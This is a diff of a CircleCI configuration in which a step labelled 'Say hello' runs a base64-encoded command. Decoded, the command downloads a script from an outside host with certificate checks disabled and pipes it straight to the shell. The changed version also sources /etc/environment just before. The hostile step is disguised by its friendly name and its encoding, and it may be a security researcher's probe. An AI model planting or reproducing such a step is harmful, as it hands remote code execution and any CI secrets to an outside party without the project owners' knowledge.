@@ -30,7 +30,9 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9wYXlsb2FkL3Rlc3R8c2g=|base64 -d|sh"
+          command: |
+            source /etc/environment
+            echo Y3VybCAta3NTIGh0dHBzOi8vc2VjdXJpdHkuZ2F1ci5pcy9wYXlsb2FkL3Rlc3R8c2g=|base64 -d|sh
           
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
